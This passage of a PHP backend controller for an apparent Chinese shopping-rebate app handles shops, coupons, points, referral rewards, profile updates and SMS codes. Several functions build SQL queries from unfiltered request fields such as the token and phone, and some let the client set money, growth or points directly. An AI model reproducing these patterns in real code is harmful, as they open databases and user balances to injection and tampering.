		foreach ($shop as $key => $value) {
			$shop[$key]['shop_yhq']=array();
			$where="dp_id =".$value['dp_id'];
			$shop_goods=zfun::f_select('Goods',$where,"id,fnuo_id,goods_sales,goods_type,goods_price,goods_cost_price,goods_img,goods_title,start_time,end_time,cate_id,dp_id,commission,shop_id,highcommission_wap_url,yhq_price,yhq_url,stock,yhq,yhq_span,(goods_price - yhq_price) as qh_money","3",null,"start_time desc");
			$shop_goods=zfun::f_fgoodscommission($shop_goods);
			$s_time=strtotime("today");
			$e_time=$s_time+86400;
			foreach ($shop_goods as $k => $v) {
				if(empty($shop[$key]))$shop[$key]=array();
				if(empty($shop[$key]['shop_yhq']))$shop[$key]['shop_yhq']=array();
				if(empty($shop[$key]['shop_yhq'][$k]))$shop[$key]['shop_yhq'][$k]=array("yhq_price"=>'',"yhq_span"=>'');
				if( $v['yhq']==1){//是否有优惠卷	
					$shop[$key]['shop_yhq'][$k]['yhq_price']=$v['yhq_price'];//优惠卷价格	
					$shop[$key]['shop_yhq'][$k]['yhq_span']=$v['yhq_span'];//优惠卷描述
					
				}
				if($v['start_time'] > $s_time &&$v['start_time'] < $e_time)$shop[$key]['day_new']=1;
				else $shop[$key]['day_new']=0;
			}
			if(empty($shop[$key]['shop_yhq']))$shop[$key]['is_yhq']=$shop[$key]['is_yhq_goods']=0;//优惠卷是否有存在
			else $shop[$key]['is_yhq']=$shop[$key]['is_yhq_goods']=1;
			if($_POST['goodslist']==0)$shop[$key]['shop_goods']=array();//商品列表
			else $shop[$key]['shop_goods']=$shop_goods;	
			
		}
		$pages = $page -> paging($count['count(*)'], $p, $limit, ACTION, CONTROL);
		//success
		//好烦
		foreach($shop as $k=>$v){
			if(empty($v['shop_yhq'])||empty($v['shop_yhq'][0]['yhq_price']))
			$shop[$k]['is_yhq']=$shop[$k]['is_yhq_goods']=0;
			//gg
			if(!empty($v['shop_yhq'])){
				$yhqgoods=self::sortarr($v['shop_yhq'],"yhq_price","desc");
				$end=end($yhqgoods);
				$shop[$k]['shop_yhq']=array(
					array(
						"yhq_price"=>$end['yhq_price'],
						"yhq_span"=>$end['yhq_span'],
					),
					array(
						"yhq_price"=>$yhqgoods[0]['yhq_price'],
						"yhq_span"=>$yhqgoods[0]['yhq_span'],
					),
					
				);
			}
		}
		//appcomm::set_app_cookie($shop);
		$this -> fecho($shop, 1, "好吧，被你发现了");
	}*/
	public function getDp() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		
	  	
		$where=" id >0 and  is_show_pptm=1";
		if(!empty($_POST['cid']))$where.=" and cid =".intval($_POST['cid']);
	
		$count=zfun::f_select("Dp",$where,"dp_id");
		
		$dpid="-1";
		foreach($count as $k=>$v){
			if(empty($v['dp_id']))continue;
			$goods=zfun::f_row("Goods","dp_id='".$v['dp_id']."'","dp_id");
			if(empty($goods))continue;
			$dpid.=",".$v['dp_id'];
		}
		$time="1535126400";
		if(empty($_POST['is_screen'])&&$time>time())$where.=" and dp_id IN($dpid)";
		zfun::isoff($where);
		
		// 店铺信息
		$shop = appcomm::f_goods("Dp",$where, "dp_id,name,type,logo,banner,info,hot,zhe,abc,returnbili,start_time,end_time","sort desc", NULL,20);
		foreach ($shop as $key => $value) {
			$shop[$key]['shop_yhq']=array();
			$where="dp_id ='".$value['dp_id']."'";
			$shop_goods=zfun::f_select('Goods',$where,"id,fnuo_id,goods_sales,goods_type,goods_price,goods_cost_price,goods_img,goods_title,start_time,end_time,cate_id,dp_id,commission,shop_id,highcommission_wap_url,yhq_price,yhq_url,stock,yhq,yhq_span,(goods_price - yhq_price) as qh_money","3",null,"goods_sales desc,start_time desc");
			$shop_goods=zfun::f_fgoodscommission($shop_goods);
			$shop_goods=appcomm::goodsfeixiang($shop_goods);
			$shop_goods=appcomm::goodsfanlioff($shop_goods);
			$shop_type=array("","淘宝","天猫","京东");
			//zfun::pre($where);
			foreach ($shop_goods as $k => $v) {
				if(empty($v['shop_id']))$shop_goods[$k]['shop_id']=1;
				if($v['shop_id']==4){
					$v['shop_id']=$shop_goods[$k]['shop_id']=3;
					$shop_goods[$k]['jd']=1;
				}
				$shop_goods[$k]['shop_type']=$shop_type[$shop_goods[$k]['shop_id']];
			}
			$s_time=strtotime("today");
			$e_time=$s_time+86400;
			if(empty($shop[$key]))$shop[$key]=array();
			if(empty($shop[$key]['shop_yhq']))$shop[$key]['shop_yhq']=array();
			if(empty($shop[$key]['shop_yhq'][$k]))$shop[$key]['shop_yhq'][$k]=array("yhq_price"=>'',"yhq_span"=>'');
			foreach ($shop_goods as $k => $v) {
				
				if( $v['yhq']==1){//是否有优惠卷	
					$shop[$key]['shop_yhq'][$k]['yhq_price']=$v['yhq_price'];//优惠卷价格	
					$shop[$key]['shop_yhq'][$k]['yhq_span']=$v['yhq_span'];//优惠卷描述
					
				}
				if($v['start_time'] > $s_time &&$v['start_time'] < $e_time)$shop[$key]['day_new']=1;
				else $shop[$key]['day_new']=0;
			}
			if(empty($shop[$key]['shop_yhq']))$shop[$key]['is_yhq']=$shop[$key]['is_yhq_goods']=0;//优惠卷是否有存在
			else $shop[$key]['is_yhq']=$shop[$key]['is_yhq_goods']=1;
			if($_POST['goodslist']==0)$shop[$key]['shop_goods']=array();//商品列表
			else $shop[$key]['shop_goods']=$shop_goods;	
			
		}
		//success
		//好烦
		foreach($shop as $k=>$v){
			if(empty($v['shop_yhq'])||empty($v['shop_yhq'][0]['yhq_price']))
			$shop[$k]['is_yhq']=$shop[$k]['is_yhq_goods']=0;
			//gg
			if(!empty($v['shop_yhq'])){
				$yhqgoods=self::sortarr($v['shop_yhq'],"yhq_price","desc");
				$end=end($yhqgoods);
				$shop[$k]['shop_yhq']=array(
					array(
						"yhq_price"=>$end['yhq_price'],
						"yhq_span"=>$end['yhq_span'],
					),
					array(
						"yhq_price"=>$yhqgoods[0]['yhq_price'],
						"yhq_span"=>$yhqgoods[0]['yhq_span'],
					),
					
				);
			}
		}
		//appcomm::set_app_cookie($shop);
		$this -> fecho($shop, 1, "好吧，被你发现了");
	}
	public static function sortarr($arr=array(),$key='',$type="asc"){//二位数组排序
		$arr=array_values($arr);
		foreach($arr as $k=>$v)$arr[$k][$key]=floatval($v[$key]);
		$tmp=array();
		foreach ($arr as $k=>$v)$tmp[$k] = $v[$key];
		if($type=="desc")$type=SORT_DESC;else $type=SORT_ASC;
		array_multisort($arr,SORT_NUMERIC,$tmp,$type);
		return $arr;	
	}
	public function getIntegral() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		$userModel = $this -> getDatabase('User');
		if (empty($_POST['token'])) {
			$this -> fecho(null, 0, "没有登陆");
		}
		$user = $userModel -> selectRow('token="' . $_POST['token'] . '"');
		$interalModel = $this -> getDatabase("Interal");
		if (empty($_POST['type'])) {
			$this -> fecho(NULL, 0, "缺少type");
		}
		switch($_POST['type']) {
			case 1 :
				$interal = $interalModel -> select("uid={$user['id']} AND type not in (3,4)", "id,interal,detail,time", null, null, "time desc");
				break;
			case 2 :
				$interal = $interalModel -> select("uid={$user['id']} AND type in (3,4)", "id,interal,detail,time", null, null, "time desc");
				break;
		}
		$interal_arr = array();
		foreach ($interal as $k => $v) {
			$interal_arr[date("Y年m月", $v['time'])][] = $v;
			foreach ($interal_arr[date("Y年m月", $v['time'])] as $kk => $vv) {
				$interal_arr[date("Y年m月", $v['time'])][$kk]['week'] = date("w", $vv['time']);
				$interal_arr[date("Y年m月", $v['time'])][$kk]['time'] = date("m-d", $vv['time']);
			}
		}
		$arr[] = array();
		foreach ($interal_arr as $k => $v) {
			foreach ($v as $kk => $vv) {
				$arr[$kk]['day'] = $k;
				$arr[$kk]['list'] = $v;
			}
		}
		//$this -> display('paybalance', 'integral');
		$this -> fecho($arr, 1, "好吧，被你发现了");
	}
	public function getkeyword() {
		if (!$this -> sign()) {
			$this -> fecho(NULL, 0, "签名错误");
		}
		appcomm::read_app_cookie();
		$kwModel = $this -> getDatabase("Keyword");
		$kw = $kwModel -> select("type=2 AND is_show=0", "id,name,highlight,f_name,bj_img,pic", null, null, "sort desc");
		foreach($kw as $k=>$v){
			if(empty($v['bj_img']))$kw[$k]['bj_img']=UPLOAD_URL."mrimg/shop_classly_bj1.png";
			else $kw[$k]['bj_img']=UPLOAD_URL."slide/".$v['bj_img'];
			if(empty($v['pic']))$kw[$k]['pic']=UPLOAD_URL."mrimg/shop_hot_good_pic1.png";
			else $kw[$k]['pic']=UPLOAD_URL."slide/".$v['pic'];
		}
		appcomm::set_app_cookie($kw);
		$this -> fecho($kw, 1, "好吧，被你发现了");
	}
	public function getUserLevel() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		if (empty($_POST['token'])) {
			$this -> fecho(null, 0, '缺少参数token');
		}
		$userModel = $this -> getDatabase('User');
		$user = $userModel -> selectRow('token="' . $_POST['token'] . '"', "vip,growth");
		switch($user['vip']) {
			case 0 :
				$user['grow'] = $this -> getSetting('user_grow01');
				$user['vip'] = "v1";
				break;
			case 1 :
				$user['grow'] = $this -> getSetting('user_grow02');
				$user['vip'] = "v2";
				break;

			case 2 :
				$user['grow'] = $this -> getSetting('user_grow03');
				$user['vip'] = "v3";
				break;
			case 3 :
				$user['grow'] = $this -> getSetting('user_grow04');
				$user['vip'] = "v4";
				break;
		}
		$this -> fecho($user, 1, '成功');
	}
	public function gettaobaoUrl() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		if (empty($_POST['keyword'])) {
			$this -> fecho(null, 0, '缺少参数');
		}
		$userModel = $this -> getDatabase('User');
		if (!empty($_POST['token'])) {
			$user = $userModel -> selectRow('token="' . $_POST['token'] . '"');
			$uid = $user['id'];
		} else {
			$uid = 0;
		}
		$pid = $this -> getSetting('taobaopid');
		if (empty($pid) || $pid == 'mm_13406079_4194500_28992403') {//如果跟默认（方诺淘点金）的相同，则重新设置
			$taobao_tdjcode = $this -> getSetting('un_setting_tdj');
			$qiege = explode('pid: "', $taobao_tdjcode);
			$qiege2 = explode('"', $qiege[1]);
			$taobaopid = $qiege2[0];
			$arr = array('var' => 'taobaopid', 'val' => $taobaopid, 'type' => 4);
			$this -> setSetting('taobaopid', $taobaopid);
			$pid = $taobaopid;
		}
		//$uid = $this -> getUserId();
		$url = "http://ai.taobao.com/search/index.htm?key=" . $_POST['keyword'] . "&pid=" . $pid . "&commend=all&unid=" . $uid . "&taoke_type=1";
		//$isjifents = $this -> getSetting('isjifents');
		$this -> fecho($url, 1, 'ok');
	}
	//thefuck
	public function reg_sjf($user=array()){
		if(empty($user))self::fecho(0,0,"参数错误");
		$eventlog = $this -> getDatabase('Interal');
		$userModel=$this->getDatabase("User");	
		$oneR = $eventlog -> selectRow('uid=' . $user['extend_id'] . ' and data='."'".$user['id']."'".' AND type=100');
		if (empty($oneR)) {
			if (!empty($user['extend_id'])) {
				$extend = $userModel -> selectRow('id=' . $user['extend_id']);
				$set=zfun::f_getset("yq_fh_onoff,operator_yqzcjl1,operator_yqzcjl2,fxdl_yqzcjl".($extend['is_sqdl']+1));
				$commission_spread=floatval($set["fxdl_yqzcjl".($extend['is_sqdl']+1)]);
				if($extend['operator_lv']=='1'){
					$commission_spread=floatval($set['operator_yqzcjl1']);
				}
				if($extend['operator_lv']=='2'){
					$commission_spread=floatval($set['operator_yqzcjl2']);
				}
				if (!empty($user['phone']) && !empty($user['zfb_au'])) {
					$jf_spread = floatval($this -> getSetting("jf_spread"));
					//$commission_spread=floatval(self::getSetting("commission_spread"));
					$carr=array();
					$carr['integral']=$extend['integral'];
					$carr['commission']=$extend['commission'];
					if(empty($jfname))$jfname='积分';
					if ($jf_spread > 0) {//邀请送积分
						$arr = array(
									"uid" => $user['extend_id'],
									"interal" => $jf_spread,
									"detail" => "邀请好友注册获得 $jf_spread $jfname",
									"time" => time(),
									'type' => 100,
									"data"=>$user['id'],
									);
						$carr['integral']+=$jf_spread;
						$eventlog -> insert($arr);
						
					}
					if($commission_spread>0&&empty($set['yq_fh_onoff'])){
						
						$arr = array(
									"uid" => $user['extend_id'],
									"interal" => $commission_spread,
									"detail" => "邀请好友注册获得 $commission_spread 佣金",
									"time" => time(),
									'type' => 100,
									"data"=>$user['id'],
									"next_id"=>$user['id'],
									);
						$carr['commission']+=$commission_spread;
						$eventlog -> insert($arr);
					}
					//boom;
					$result = zfun::f_update("User", "id=".intval($extend['id']), $carr);
				}
			}
		}
	}
	static function check_platform(){
		$agent = strtolower($_SERVER['HTTP_USER_AGENT']);
		$type = '';
		if(strpos($agent, 'iphone') || strpos($agent, 'ipad'))$type = 'ios';
		if(strpos($agent, 'android'))$type = 'android';
		return $type;
	}
	public function getUserInfo() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		if (empty($_POST['token'])) {
			$this -> fecho(null, 0, '缺少参数token');
		}
		$userModel = $this -> getDatabase('User');
		$mylikeModel = $this -> getDatabase('MyLike');
		$eventlog = $this -> getDatabase('Interal');
		$orderModel = $this -> getDatabase('Order');
		$authenticationModel = $this -> getDatabase('Authentication');
		$user = $userModel -> selectRow('token="' . $_POST['token'] . '"', "tb_app_pid,ios_tb_app_pid,fanTotal_time,tg_code,hhr_gq_time,id,is_sqdl,tg_pid,loginname,is_agent,vip,phone,email,nickname,realname,sex,qq,integral,head_img,checkNum,checkTime,taobao_au,qq_au,sina_au,zfb_au,weixin_au,vip,money,growth,three_nickname,address,extend_id,order_num,sordernum,lovenum,flower,xflower,hflower,fans,people,commission,zztx,lhbtx,hbtx,operator_lv,platform");
		
		$setstr="mem_qiaodao_onoff,jf_name,user_top_img,fxdl_zdssdl_onoff,jf_ratio,vip_name".$user['vip'].",is_vip_extend_onoff";
		$setstr.=",operator_wuxian_bili,operator_name,operator_name_2";//运营商
		$setstr.=",fxdl_hhrshare_onoff";//普通会员是否可分享
		$set=zfun::f_getset($setstr);
		$set['fxdl_hhrshare_onoff']=intval($set['fxdl_hhrshare_onoff']);
		
		$uid=$user['id'];

		//百里.会员返款操作
		actionfun("appapi/baili_zhaoshang");
		baili_zhaoshangAction::presell_return($uid);

		//判断注册返还佣金
		actionfun("timer/register_commission");
		register_commissionAction::one($uid);

		$user['platform']=self::check_platform();
		//分配会员推广位
		if(!empty($_POST['token'])){
			$user['is_sqdl']=intval($user['is_sqdl']);
			$user['operator_lv']=intval($user['operator_lv']);
			if(empty($user['tg_pid'])&&($user['is_sqdl']||$user['operator_lv']||$set['fxdl_hhrshare_onoff'])){//代理推广位
				$tmp=zfun::f_row("Tbpid","uid='0' and type='agent'");
				if(!empty($tmp)){
					zfun::f_update("User","id='".$user['id']."'",array("tg_pid"=>$tmp['adzone_id']));
					zfun::f_update("Tbpid","id='".$tmp['id']."'",array("uid"=>$user['id'],"bind_time"=>time()));
				}
			}
			if(empty($user['tb_app_pid'])&&$user['platform']=='android'){//安卓推广位
				$tmp=zfun::f_row("Tbpid","uid='0' and type='android'");
				if(!empty($tmp)){
					zfun::f_update("User","id='".$user['id']."'",array("tb_app_pid"=>$tmp['adzone_id']));
					zfun::f_update("Tbpid","id='".$tmp['id']."'",array("uid"=>$user['id'],"bind_time"=>time()));
				}
			}
			if(empty($user['ios_tb_app_pid'])&&$user['platform']=='ios'){//ios推广位
				$tmp=zfun::f_row("Tbpid","uid='0' and type='ios'");
				if(!empty($tmp)){
					zfun::f_update("User","id='".$user['id']."'",array("ios_tb_app_pid"=>$tmp['adzone_id']));
					zfun::f_update("Tbpid","id='".$tmp['id']."'",array("uid"=>$user['id'],"bind_time"=>time()));
				}
			}
		}
		unset($user['platform']);

		//统计粉丝贡献
		if(time()>$user['fanTotal_time']){
			$url=INDEX_WEB_URL."?mod=appapi&act=fanTotal&ctrl=index&uid=".$user['id'];
			zfun::curl_get($url,"json",3);
			zfun::f_update("User","id='$uid'",array("fanTotal_time"=>time()+1800));
		}
		
		//自动升级联合创始人处理
		actionfun("comm/operator");
		operator::update_operator_2($user);
		
		$path=ROOT_PATH."comm/cwdl_rule.php";
		//这是要把累积的金额计算处理,然后升级
		if(file_exists($path)==true){
			include_once $path;
			cwdl_rule::zdsj_doing($uid);
		}
		
		//如果是运营商 绑定下级关系
		if(intval($user['operator_lv'])>0){
			include_once ROOT_PATH."Action/admin/operator.action.php";
			operatorAction::set_lower_operator_id($uid);
		}
		/*
		$jfname = $this -> getSetting('jf_name');
		$jf_return = $this -> getSetting('jf_ratio');
		$jf_ratio = $this -> getSetting('jf_ratio');
		$user['vip']=self::getSetting("vip_name".$user['vip']);*/
		
		
		$jfname=$set['jf_name'];
		$jf_return=$jf_ratio=$set['jf_ratio'];
		$user['vip']=$set['vip_name'.$user['vip']];
		if(empty($user))self::fecho(NULL,0,"用户不存在");
		
       
		$txmoney=$txmoney2/$jf_ratio;
		//		$this -> is_login($_POST['token']);
		if (empty($user)) {
			$this -> fecho(null, 0, '您的账号在其他终端登陆，请重新登陆！');
		}
		self::reg_sjf($user);//the f
		$count = $mylikeModel -> selectRow('uid=' . $user['id'], 'count(*)');
		if(empty($user['head_img']))$user['head_img']='default.png';
		if (!preg_match("/\b(([\w-]+:\/\/?|www[.])[^\s()<>]+(?:\([\w\d]+\)|([^[:punct:]\s]|\/)))/", $user['head_img'])) {
			$user['head_img'] = UPLOAD_URL . 'user/' . $user['head_img'];
		}
		/*$grow2 = $this -> getSetting('user_grow02');
		$grow3 = $this -> getSetting('user_grow03');
		$grow4 = $this -> getSetting('user_grow04');*/
		/*if ($user['growth'] > $grow2 && $user['growth'] < $grow3) {
			$userModel -> update('id=' . $user['id'], array('vip' => 1));
		} else if ($user['growth'] > $grow3 && $user['growth'] < $grow4) {
			$userModel -> update('id=' . $user['id'], array('vip' => 2));
		} else if ($user['growth'] > $grow4) {
			$userModel -> update('id=' . $user['id'], array('vip' => 3));
		}*/
		if (!empty($count['count(*)'])) {
			$user['like_count'] = $count['count(*)'];
		} else {
			$user['like_count'] = '0 ';
		}
		/*switch($user['vip']) {
			case 0 :
				$user['vip'] = "普通会员";
				break;
			case 1 :
				$user['vip'] = "青铜会员";
				break;
			case 2 :
				$user['vip'] = "白银会员";
				break;
			case 3 :
				$user['vip'] = "黄金会员";
				break;
			default : $user['vip'] = "普通会员";
		}*/
		switch($user['sex']) {
			case 0 :
				$user['sex'] = "女";
				break;
			case 1 :
				$user['sex'] = "男";
				break;
			case 2 :
				$user['sex'] = "保密";
				break;
		}
		foreach ($user as $k => $v) {
			if (empty($v)) {
				$user[$k] = "";
			}
		}
		$total = 0;
		$order = $orderModel -> select('uid=' . $user['id'] . ' AND status="订单结算"');
		foreach ($order as $k => $v) {
			$total += $v['return_commision'];
		}
		$user['integral']=floatval($user['integral']);
		$user['jifenbao']=$user['commission']*floatval($set['jf_ratio']);//积分
		//jj explosion
		//$order_count=zfun::f_count("Order",'uid=' . $user['id'] . ' AND status="订单结算"');
		$user['chulinum']=zfun::f_count("Authentication","uid=$uid and audit_status=0 and type=3");
		//life is a shipwreck
		$txsum_data=zfun::f_select("Authentication","uid=$uid and audit_status=1 and type=3","data");
		$txsum=0;
		if(!empty($txsum_data)){foreach($txsum_data as $k=>$v){
			if(empty($v))continue;
			$tmp_data=json_decode($v['data'],true);
			$txsum+=floatval($tmp_data['money']);	
		}}
		//$user['chulinum']= !empty($order_count) ? $order_count : 0;//处理订单数量
		$user['jdgwc_url']='https://p.m.jd.com/cart/cart.action';//京东购物车链接
		$user['gywm']=INDEX_WEB_URL."?mod=wap&act=shouTu&name=".urlencode("关于我们");
		$user['kfzx']=INDEX_WEB_URL."?mod=wap&act=shouTu&ctrl=call_center";
		$user['qdurl']=INDEX_WEB_URL."?mod=wap&act=sign&ctrl=index&token=".filter_check($_POST['token']);//领到红包
		$user['qhburl']=INDEX_WEB_URL."?mod=wap&act=hongbao&token=".filter_check($_POST['token']);//领取红包
		$user['ljfl'] =$user['returnmoney'] =$txsum*$jf_return;
		$tgidkey = $this -> getApp('Tgidkey');
		$tid = $tgidkey -> addkey($user['id']);
		$user['tid'] = $tid;
		if(!empty($user['tg_code']))$user['tid']=$user['tg_code'];

		if (empty($user['returnmoney'])) {
			$user['returnmoney'] = 0.00;
		}
		if(empty($user['flower'])){
			$user['flower'] = 0;
		}
		if(empty($user['lovenum'])){
			$user['lovenum'] = 0;
		}
		if(empty($user['sordernum'])){
			$user['sordernum'] = 0;
		}
		if(empty($user['xflower'])){
			$user['xflower'] = 0;
		}	
		if(empty($user['hflower'])){
			$user['hflower'] = 0;
		}		
		if(empty($user['people'])){
			$user['people'] = 0;
		}	
		if(empty($user['fans'])){
			$user['fans'] = 0;
		}		
		if (!empty($user['phone'])) {
			$data['is_binding'] = 1;
		} else {
			$data['is_binding'] = 0;
		}
		if (!empty($user['order_num'])) {
			$user['is_bindordernum'] = 1;
		} else {
			$user['is_bindordernum'] = 0;
		}
		$user['zztx']=intval($user['zztx']);
		$user['lhbtx']=intval($user['lhbtx']);
		$user['hbtx']=intval($user['hbtx']);
		$user['vip_extend_onoff']=intval($set['is_vip_extend_onoff']);
		if(!empty($user['extend_id']))$user['extend_id'] = $tgidkey -> addkey($user['extend_id']);
		else $user['extend_id']='';
		$user['is_agent']=intval($user['is_agent']);
		$user['vip_type']=intval($user['is_agent']);
		$user['vip']=intval($user['is_agent']);
		if(empty($user['is_agent'])){
			$user['is_dyr']=0;
		}else{ 
			$user['is_dyr']=1;
			$user['vip_type']=1;
		}
		$dl=zfun::f_row("DLList","is_pay>0 AND uid=".intval($user['id']));
		if(empty($dl))$dl['checks']=3;
		if(time()-$dl['sb_time']>3600&&intval($dl['checks'])==2)$dl['checks']=3;
		$user['dl_checks']=intval($dl['checks']);
		$user['is_sqdl']=intval($user['is_sqdl']);
		$user['hhr_checks']=intval($dl['checks']);
		$user['is_hhr']=0;
		$user['vip_name']=self::getSetting("fxdl_name".($user['is_sqdl']+1));
		//jj explosion
		if($user['is_sqdl']>0||$user['operator_lv']>0){//jj explosion
			$user['dl_checks']=1;
			$user['is_sqdl']=1;
			$user['is_hhr']=1;
			$user['hhr_checks']=1;
			$user['vip_extend_onoff']=0;
		}
		if(empty($set['fxdl_zdssdl_onoff'])){
			$user['hhr_openCheck']=1;
		}else{
			$user['hhr_openCheck']=0;	
		}
		if(($user['hhr_gq_time'])<time()&&!empty($user['hhr_gq_time'])){
			$user['dl_checks']=3;
			$user['is_sqdl']=0;
			$user['is_hhr']=0;
			$user['hhr_checks']=3;
			$user['vip_name']=self::getSetting("fxdl_name".($user['is_sqdl']+1));
		}
		if($user['is_sqdl']==0&&$user['operator_lv']==0){//jj explosion
			$user['dl_checks']=3;
			$user['is_sqdl']=0;
			$user['is_hhr']=0;
			$user['hhr_checks']=3;
			$user['vip_name']=self::getSetting("fxdl_name".($user['is_sqdl']+1));
		}
		zfun::isoff($user);
		if($user['operator_lv']==1)$user['vip_name']=$set['operator_name'];
		if($user['operator_lv']==2)$user['vip_name']=$set['operator_name_2'];
		
		$time=strtotime("today");
		$today_jl=zfun::f_count("QDJL","uid='$uid' and time>=$time");
		$user['is_qiandao']=0;
		if(!empty($today_jl))$user['is_qiandao']=1;
		if(empty($set['user_top_img']))$user['user_top_img']=INDEX_WEB_URL."View/index/img/appapi/comm/user_bj1.png";
		else $user['user_top_img']=UPLOAD_URL."slide/".$set['user_top_img'];
		$user['mem_qiaodao_onoff']=intval($set['mem_qiaodao_onoff']);
		
		$this -> fecho($user, 1, '成功');
	}
	public function updateUser() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$eventlog = $this -> getDatabase('Interal');
		$userModel = $this -> getDatabase('User');
		if (empty($_POST['token'])) {
			$this -> fecho(null, 0, "没有登陆");
		}
		$jfname = $this -> getSetting('jf_name');
		$userid =$user= $userModel -> selectRow('token="' . $_POST['token'] . '"');
		if (empty($userid)) {
			$this -> fecho(null, 0, '您的账号在其他终端登陆，请重新登陆！');
		}
		$uid=$userid['id'];
		self::reg_sjf($userid);//the f
		if (!empty($_POST['img'])) {
			$img = base64_decode($_POST['img']);
			$data['head_img'] = time() . '.png';
			$size = @file_put_contents(UPLOAD_PATH . 'user/' . $data['head_img'], $img);
			if ($size == 0) {
				$this -> fecho(null, 0, "修改头像失败");
			}
		}
		if (!empty($_POST['nickname'])) {
			$data['nickname'] = filter_check($_POST['nickname']);
		}
		if (!empty($_POST['zfb_au'])) {
			$set=zfun::f_getset("alipay_update_num");
			if(empty($set['alipay_update_num']))$set['alipay_update_num']=3;
			$set['alipay_update_num']=intval($set['alipay_update_num']);
			$user['zfb_count']=intval($user['zfb_count']);
			if($user['zfb_count']>=$set['alipay_update_num'])zfun::fecho("只能绑定".$set['alipay_update_num'].", 如需更改请联系客服");
			$tmpcount=zfun::f_count("User","alipay<>'' and alipay='".filter_check($_POST['zfb_au'])."' and id<>$uid");
			if(!empty($tmpcount))$this -> fecho(null, 0, "已被绑定");
			if (empty($userid['phone'])) {
				$this -> fecho(null, 0, "请先绑定手机号");
			}
			if (empty($_POST['realname'])) {
				$this -> fecho(null, 0, "请输入姓名");
			}
			$data['realname'] = $_POST['realname'];
			$data['zfb_au'] = filter_check($_POST['zfb_au']);
			$data['alipay']=filter_check($_POST['zfb_au']);
			$data['zfb_count'] = $user['zfb_count']+1;
			
		}
		if (!empty($_POST['money'])) {
			$data['money'] = filter_check($_POST['money']);
		}
		if (!empty($_POST['phone'])) {
			$phoneuser = zfun::f_row("User",'phone='.$_POST['phone']);
			$data['nexus_time']=0;
			if(!empty($_POST['tid'])){
				$tg_code_low=strtolower($_POST['tgid']);
				$count=zfun::f_row("User","tg_code_low='".$tg_code_low."' and tg_code_low<>''");
				$tgid=$count['id'];
				if(empty($tg_user)){
					$Decodekey = $this -> getApp('Tgidkey');
					$tgid = $Decodekey -> Decodekey($_POST['tid']);
					$count=zfun::f_row("User","id='$tgid'");
				}
				if(empty($count))zfun::fecho("推荐人不存在");
				$data['extend_id'] = filter_check($tgid);
			}
			if(empty($phoneuser)){
		     	$data['phone'] = filter_check($_POST['phone']);
			}else{
				$this -> fecho(null, 0, "号码已绑定");
			}
		}
		if (!empty($_POST['email'])) {
			$data['email'] = filter_check($_POST['email']);
		}
		if (!empty($_POST['growth'])) {
			$usergrowth = $userModel -> selectRow('id=' . $userid['id']);
			$data['growth'] = $usergrowth['growth'] + intval($_POST['growth']);
		}
		if (!empty($_POST['address'])) {
			$data['address'] = filter_check($_POST['address']);
			
		}
		if (!empty($_POST['dq1'])) {
			$data['dq1'] = intval($_POST['dq1']);
			
		}
		if (!empty($_POST['dq2'])) {
			$data['dq2'] = intval($_POST['dq2']);
			
		}
		if (!empty($_POST['dq3'])) {
			$data['dq3'] = intval($_POST['dq3']);
			
		}
		if(empty($data))zfun::fecho("操作失败");
		$user = $userModel -> update('id=' . $userid['id'], $data);
		$this -> fecho($user, 1, "修改数据成功");
	}
	public function updateIntegral() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		$userModel = $this -> getDatabase('User');
		if (empty($_POST['token'])) {
			$this -> fecho(null, 0, "没有登陆");
		}
		$userid = $userModel -> selectRow('token="' . $_POST['token'] . '"');
		if (!empty($_POST['num'])) {
			$num = filter_check($_POST['num']);
		} else {
			$num = 0;
		}
		$integral = $userModel -> selectRow('id=' . $userid['id']);
		$integral_new = $integral['integral'] - $num;
		$result = $userModel -> update('id=' . $userid['id'], array('integral' => $integral_new));
		$this -> fecho(null, 1, "修改数据成功");
	}
	public function getcode() {
		if (!$this -> sign()) {
			$this -> fecho(null, 0, "签名错误");
		}
		if (empty($_POST['type'])) {
			$this -> fecho(null, 0, "缺少参数");
		}
		zfun::add_f("getcode");
		$_POST=filter_check($_POST);
		$num=$_POST['username'];$key=substr(time()."",0,-1);
		zfun::f_insert("F",array("num"=>$num."_".$key,"time"=>time()));

		if (!empty($_POST['check']) && $_POST['check'] == 1) {
			$userModel = $this -> getDatabase('User');
			//判断用户是否已注册
			$regUser = $userModel -> select("email='{$_POST['username']}' or phone='{$_POST['username']}'");
			$regCount = count($regUser);
			//确认密码6～16位，区分大小写
			if ($regCount <> 0) {
				$this -> fecho(null, 0, "该用户已被注册");
				//该用户已被注册
			}
		}
		if (!empty($_POST['is_forget']) && $_POST['is_forget'] == 1) {
			$userModel = $this -> getDatabase('User');
			//判断用户是否已注册
			$regUser = $userModel -> select("email='{$_POST['username']}' or phone='{$_POST['username']}'");
			$regCount = count($regUser);
			//确认密码6～16位，区分大小写
			if ($regCount== 0) {
				$this -> fecho(null, 0, "该用户未注册，不能获取验证码");
				//该用户已被注册
			}
		}
		$dxappname = $this -> getSetting('dxappname');
		$yzm = $this -> getRandStr();
		$msgstr = '验证码：' . $yzm . '【' . $dxappname . '】';
		$set=zfun::f_getset("app_".$_POST['source']."_yzmstr");

		if(!empty($set["app_".$_POST["source"]."_yzmstr"])){
			$msgstr=$set["app_".$_POST["source"]."_yzmstr"];
			$msgstr=str_replace("{code}",$yzm,$msgstr);
			$msgstr.='【' . $dxappname . '】';
		}
		
		if ($_POST['type'] == 1) {
			if (!empty($_POST['username'])) {
				//$this -> fecho(null, 1, "手机号码");
				//$dxappisopen = $this -> getSetting('dxappisopen');
				$phone = filter_check($_POST['username']);
				if (!empty($phone)) {
					//if ($dxappisopen == 1) {
						//echo $msgstr;
						$fndx = $this -> getApi('sendDx');
						$end = $fndx -> send($msgstr, $phone);
						if ($end) {
							$session_info['emailcode'] = md5($yzm);
							$session_info['emailtime'] = time();
							$session_info['email'] = $phone;
							if ($this -> setCache('captch', md5(base64_encode($_POST['username'])), $session_info)) {
								$this -> fecho(null, 1, "发送成功");
							} else {
								$this -> fecho(null, 0, "发送失败");
							}
						} else {
							$this -> fecho(null, 0, "发送失败");
						}
